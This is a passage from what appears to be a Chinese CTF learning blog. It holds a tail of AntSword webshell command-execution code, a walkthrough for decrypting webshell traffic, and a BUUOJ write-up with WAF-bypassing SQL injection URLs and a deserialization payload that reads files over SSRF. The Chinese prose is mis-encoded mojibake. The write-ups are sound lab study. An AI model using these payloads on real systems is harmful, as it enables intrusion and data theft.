class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot; &quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>åœ¨è¿™ä¸€ä¸²ä»£ç ä¸­å¯ä»¥å‘ç°æœ‰å‡ ä¸ªå…³é”®å‡½æ•°ï¼šasenc(),asoutput(),å‘ç°è¾“å‡ºçš„å†…å®¹æ˜¯f3c7239848e0+asenc($output)+05fda2646cï¼Œasencé‡Œé¢æ˜¯ç”¨AES-128-ECBåŠ å¯†ï¼Œkeyæ˜¯sessionå‰16ä½ï¼Œå»åŒ…é‡Œæ‰¾å°±è¡Œã€‚</p><h3 id="æ•°æ®è¿˜åŸ"><a href="#æ•°æ®è¿˜åŸ" class="headerlink" title="æ•°æ®è¿˜åŸ"></a>æ•°æ®è¿˜åŸ</h3><p>æ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯è¿˜åŸæ•°æ®ï¼Œé€šè¿‡ä»£ç å®¡è®¡å¯ä»¥çŸ¥é“base64(AESåŠ å¯†ï¼ˆbase64(out)ï¼‰)åçš„å†…å®¹æ˜¯+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=<br>æŠŠè¿™ä¸ªè§£å¯†å°±è¡Œäº†ã€‚è§£å¯†æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=openssl_decrypt(<span class="variable">$payload</span>, <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$k</span>,OPENSSL_RAW_DATA)</span><br></pre></td></tr></table></figure><p>ç„¶åå†åšä¸¤æ¬¡base64è§£å¯†å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚(cat flagé‡Œé¢çš„æ–‡ä»¶ä¹Ÿæ˜¯base64åŠ å¯†çš„)</p><h2 id="é¢˜ç›®æ€»ç»“"><a href="#é¢˜ç›®æ€»ç»“" class="headerlink" title="é¢˜ç›®æ€»ç»“"></a>é¢˜ç›®æ€»ç»“</h2><p>è¿™é“é¢˜æœ‰ç‚¹éº»çƒ¦ï¼Œä¸»è¦æ˜¯ä¸äº†è§£èšå‰‘çš„æµé‡ç‰¹å¾ã€‚åœ¨awdä¸­shellçš„å…æ€ä¸wafæ°¸è¿œæ˜¯åœ¨ä¸æ–­è¿­ä»£å‡çº§çš„ã€‚è¿˜éœ€è¦å­¦ä¹ çš„å§¿åŠ¿æœ‰å¾ˆå¤šï¼Œåº”è¯¥å¤šåˆ†ææµé‡ï¼Œæ€»ç»“ç‰¹ç‚¹ã€‚</p><h2 id="è“ç‰™æ•°æ®åŒ…"><a href="#è“ç‰™æ•°æ®åŒ…" class="headerlink" title="è“ç‰™æ•°æ®åŒ…"></a>è“ç‰™æ•°æ®åŒ…</h2><p>è“ç‰™è¿™é“é¢˜æˆ‘ä¸€å¼€å§‹çœ‹åˆ°æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå› ä¸ºæ²¡æœ‰å­¦è¿‡è“ç‰™ç›¸å…³çš„åè®®ã€‚äºæ˜¯ä»ç½‘ä¸Šç°å­¦äº†ç‚¹ï¼Œå‘ç°ä¼ è¾“æ•°æ®ä½¿ç”¨çš„åè®®ï¼Œæœäº†æœåè®®åè¿˜çœŸæœå‡ºæ¥ä¸ª.7zæ–‡ä»¶ã€‚<br>æœå‡ºæ¥ä¹‹åæŠŠè¿™ç©æ„åå…­è¿›åˆ¶å¯¼å…¥åˆ°010editorè¿˜åŸæˆ.7zï¼Œæç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œé¦–å…ˆè€ƒè™‘ä¼ªåŠ å¯†ï¼Œå‘ç°ä¸æ˜¯ï¼ˆå…¶å®360ä¼šè‡ªåŠ¨ä¿®å¤ä¼ªåŠ å¯†ï¼‰ç„¶åçœ‹æ–‡ä»¶åæç¤ºäº†å¯†ç æ˜¯è“ç‰™çš„PINï¼Œ<br>äºæ˜¯åœ¨åŒ…ä¸­æœç´¢â€œPINâ€ã€‚<br>ç¬¬ä¸€æ¬¡æœç´¢å…¶å®æˆ‘æœåˆ°äº†ã€‚ã€‚ä½†æ˜¯æ²¡æ‰¾åˆ°PIN,åˆšæƒ³çˆ†ç ´ï¼ˆPINçº¯æ•°å­—ï¼Œä½æ•°å°‘ï¼Œå¥½çˆ†ç ´ï¼‰çš„æ—¶å€™æœ‹å‹è¯´ä½ æœâ€PINâ€å°±è¡Œã€‚ã€‚ã€‚æˆ‘ã€‚ã€‚åäº†ã€‚<br>æœåˆ°PINä¹‹åè§£å‹æ–‡ä»¶å¾—åˆ°flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200421å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»Šå¤©åšbuuojåšäº†ä¸€é“webé¢˜ï¼Œæ€»çš„æ¥è¯´è€ƒå¯Ÿåˆ°äº†SQLæ³¨å…¥ã€SSRFã€ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ã€‚è¿™ä¸‰ä¸ªè€ƒç‚¹æˆ‘éƒ½æƒ³åˆ°äº†ï¼Œä½†æ˜¯ä¸€å—è€ƒæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚"><a href="#ä»Šå¤©åšbuuojåšäº†ä¸€é“webé¢˜ï¼Œæ€»çš„æ¥è¯´è€ƒå¯Ÿåˆ°äº†SQLæ³¨å…¥ã€SSRFã€ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ã€‚è¿™ä¸‰ä¸ªè€ƒç‚¹æˆ‘éƒ½æƒ³åˆ°äº†ï¼Œä½†æ˜¯ä¸€å—è€ƒæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚" class="headerlink" title="ä»Šå¤©åšbuuojåšäº†ä¸€é“webé¢˜ï¼Œæ€»çš„æ¥è¯´è€ƒå¯Ÿåˆ°äº†SQLæ³¨å…¥ã€SSRFã€ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ã€‚è¿™ä¸‰ä¸ªè€ƒç‚¹æˆ‘éƒ½æƒ³åˆ°äº†ï¼Œä½†æ˜¯ä¸€å—è€ƒæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚"></a>ä»Šå¤©åšbuuojåšäº†ä¸€é“webé¢˜ï¼Œæ€»çš„æ¥è¯´è€ƒå¯Ÿåˆ°äº†SQLæ³¨å…¥ã€SSRFã€ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ã€‚è¿™ä¸‰ä¸ªè€ƒç‚¹æˆ‘éƒ½æƒ³åˆ°äº†ï¼Œä½†æ˜¯ä¸€å—è€ƒæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚</h1><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/weixin_43818995/article/details/104529233">https://blog.csdn.net/weixin_43818995/article/details/104529233</a><br><a href="https://blog.csdn.net/weixin_45425482/article/details/103868660">https://blog.csdn.net/weixin_45425482/article/details/103868660</a><br><a href="https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html">https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html</a><br><a href="https://www.w3school.com.cn/sql/sql_union.asp">https://www.w3school.com.cn/sql/sql_union.asp</a></p><h2 id="çŸ¥è¯†é“ºå«"><a href="#çŸ¥è¯†é“ºå«" class="headerlink" title="çŸ¥è¯†é“ºå«"></a>çŸ¥è¯†é“ºå«</h2><h3 id="MYSQL-UNION-SELECT-ï¼š"><a href="#MYSQL-UNION-SELECT-ï¼š" class="headerlink" title="MYSQL UNION SELECT ï¼š"></a>MYSQL UNION SELECT ï¼š</h3><p>æ¯”å¦‚<br>select username,password from user union select 1,2<br>UNION ç»“æœé›†ä¸­çš„åˆ—åæ€»æ˜¯ç­‰äº UNION ä¸­ç¬¬ä¸€ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—åã€‚<br>å¯ä»¥å…ˆæ ¹æ®orderbyåˆ¤æ–­å­—æ®µä¸ªæ•°ï¼Œåˆ¤æ–­å®Œå­—æ®µä¸ªæ•°åæ ¹æ®union select 1ï¼Œ2ï¼Œ3â€¦åˆ¤æ–­åœ¨å“ªå„¿æ˜¾ç¤ºã€‚<br>å¯¹union UNION ç»“æœé›†ä¸­çš„åˆ—åæ€»æ˜¯ç­‰äº UNION ä¸­ç¬¬ä¸€ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—å  è¿™å¥è¯çš„ä¸¾ä¾‹ï¼š</p><img src="http://cdn.polowong.top/static/images/04211.jpg"><h3 id="MYSQL-CONCAT-GROUP-CONCAT"><a href="#MYSQL-CONCAT-GROUP-CONCAT" class="headerlink" title="MYSQL CONCAT GROUP_CONCAT"></a>MYSQL CONCAT GROUP_CONCAT</h3><p>concat(str1,â€™separatorâ€™,str2) // separatoræ˜¯åˆ†éš”ç¬¦<br>å¯ä»¥åœ¨ç»“æœä¸­è¿æ¥å¤šä¸ªå­—æ®µ æ¯”å¦‚ä¸‹å›¾ä¸¾ä¾‹ è¿æ¥username,passwordä¸ºä¸€ä¸ªå­—æ®µã€‚</p><img src="http://cdn.polowong.top/static/images/04212.jpg"><p>group_concat()GROUP_CONCATå‡½æ•°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆã€‚<br>ç®€å•çš„æ¥è¯´å°±æ˜¯æŠŠæŸ¥è¯¢åˆ°çš„æ•°æ®ä¸¢åˆ°ä¸€è¡Œæ˜¾ç¤ºï¼Œåœ¨æ³¨å…¥çš„æ—¶å€™å°±ä¸ç”¨ä¸€ä¸ªä¸ªlimitäº†ã€‚<br>æ¯”å¦‚æŸ¥è¡¨åï¼šselect group_concat(table_name) from information_schema.tables where table_Schema=æ•°æ®åº“å ä¸€æ¡å¯ä»¥æŸ¥åˆ°è¯¥æ•°æ®åº“æ‰€æœ‰çš„è¡¨å</p><img src="http://cdn.polowong.top/static/images/04213.jpg"><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>phpçš„curlæœªç»ä¸¥æ ¼è¿‡æ»¤å¯èƒ½å¯¼è‡´SSRFï¼ˆåˆ©ç”¨fileåè®®ã€‚ï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>è¿›å»ä¹‹åæ³¨å†Œï¼Œæ³¨å†Œå®Œä¸çŸ¥é“æœ‰å•¥ç”¨äº†ï¼Œæ‰“å¼€æ‰«æå™¨æ‰«ä¸€ä¸‹ï¼Œæ‰«åˆ°äº†robots.txt<br>robots.txtæç¤ºäº†æœ‰ä¸ªuser.phpçš„å¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹è¯¥æ–‡ä»¶åˆ†æå¯ä»¥å‘ç°å­˜åœ¨SSRFåˆ©ç”¨ç‚¹ï¼Œå…¶ä»–çš„æš‚æ—¶æ²¡æƒ³èµ·æ¥ã€‚ç„¶åçœ‹ä¸€ä¸‹/view.php<br>æ³¨æ„urlï¼Œç©¿äº†ä¸ªå‚æ•°ã€‚ã€‚maybeæ³¨å…¥ï¼Ÿ<br>ç»™ä¸ª-1è¯•è¯•ï¼šæŠ¥é”™ã€‚æŠŠç»å¯¹è·¯å¾„çˆ†å‡ºæ¥äº†ï¼š/var/www/html/view.php<br>å†æŸ¥æŸ¥è¯•è¯•ï¼š-1 union select 1,2,3 ç»™wafäº† è¿‡æ»¤äº†å•¥ä¸çŸ¥é“ æŒ¨ä¸ªè¯•è¯•ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº† union select,æŠŠç©ºæ ¼æ¢æˆæ³¨é‡Šç»•è¿‡ã€‚union/<strong>/selectæˆåŠŸç»•è¿‡ã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­åˆ—æ•°ï¼ŒæŸ¥æ•°æ®åº“åï¼ŒæŸ¥è¡¨åï¼ŒæŸ¥å­—æ®µã€‚ã€‚<br><a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/</a></strong>/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 è¿™æ˜¯æŸ¥å­—æ®µ<br>ç„¶åæŸ¥dataå­—æ®µ <a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20users</a><br>å‘ç°æ•°æ®æ˜¯O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:6:â€123123â€;s:3:â€ageâ€;i:123123;s:4:â€blogâ€;s:13:â€<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a><br>çœ¼ç†Ÿä¸ï¼Ÿåºåˆ—åŒ–åçš„æ•°æ®ï¼Ÿæ˜¯ä¸æ˜¯è¯¥æƒ³æƒ³ååºåˆ—åŒ–çš„é—®é¢˜äº†ï¼Ÿ<br>ç„¶åè¯»å¤‡ä»½çš„ä»£ç ï¼Œæˆ‘ä»¬åº”è¯¥åˆ©ç”¨getBlogContentsï¼ˆï¼‰æ–¹æ³•è¿›è¡ŒSSRF,å†…å®¹ä¸ºfile://var/www/html/flag.phpï¼Œé‚£ä¹ˆæ³¨å†Œçš„æ—¶å€™èƒ½å¡«è¿™ä¸ªä¸ï¼Ÿå½“ç„¶è¿‡æ»¤äº†ã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬çŒœæµ‹ï¼Œå®Œæ•´çš„æµç¨‹åº”è¯¥æ˜¯è¿™æ ·ï¼š<br>ç”¨æˆ·æ³¨å†Œhttpå¼€å¤´çš„blogï¼ŒæŠŠå¯¹è±¡åºåˆ—åŒ–åå­˜å…¥æ•°æ®åº“ï¼Œå½“ç”¨æˆ·æŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŸ¥è¯¢åˆ°åºåˆ—åŒ–æ•°æ®ååºåˆ—åŒ–ï¼Œç„¶åäº¤ç»™getBlogContentsï¼ˆï¼‰æ–¹æ³•å»ç”¨curlå‘é€è¯·æ±‚ã€‚<br>æˆ‘ä»¬è¦åšçš„å°±æ˜¯è®©æ•°æ®åº“æŸ¥åˆ°çš„è¯·æ±‚è¿”å›çš„æ˜¯æˆ‘ä»¬æ¶æ„æ„é€ çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„blogä¸ºfile:///var/www/html/flag.phpã€‚<br>å°±æ˜¯è¦æŠŠ O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:3:â€123â€;s:3:â€ageâ€;i:0;s:4:â€blogâ€;s:29:â€file:///var/www/html/flag.phpâ€;} è¿™ä¸€ä¸²å½“ä½œæŸ¥è¯¢è¿”å›çš„ç»“æœï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŸUNION SELECTï¼<br>æ³¨æ„ä¸åˆ—å¯¹åº”ï¼ˆæ ¹æ®æˆ‘ä»¬åˆšæ‰æŸ¥çš„åˆ—ï¼ŒçŸ¥é“dataæ˜¯ç¬¬å››ä¸ªå­—æ®µï¼Œæ‰€ä»¥æŠŠpayloadæ”¾åˆ°ç¬¬å››ä¸ªå­—æ®µä¸Šå¯¹åº”~ï¼‰<br>payload:<a href="http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:%7Bs:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;%7D%27">http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</a><br>ç„¶åæŸ¥çœ‹æºç ä¸­çš„iframeï¼Œè§£å¯†base64å¾—åˆ°flagã€‚</p><h2 id="åœ¨ä¸Šå¸è§†è§’å†çœ‹è¿™é“é¢˜"><a href="#åœ¨ä¸Šå¸è§†è§’å†çœ‹è¿™é“é¢˜" class="headerlink" title="åœ¨ä¸Šå¸è§†è§’å†çœ‹è¿™é“é¢˜"></a>åœ¨ä¸Šå¸è§†è§’å†çœ‹è¿™é“é¢˜</h2><p>ä¸ºäº†è¯æ˜æˆ‘çš„æ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘åˆ©ç”¨SSRFæ¼æ´è·å–åˆ°äº†db.php,user.php,show,php,join.ok.php<br>ä¸‹é¢æ˜¯view.phpçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;error.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> DB();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ko&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = 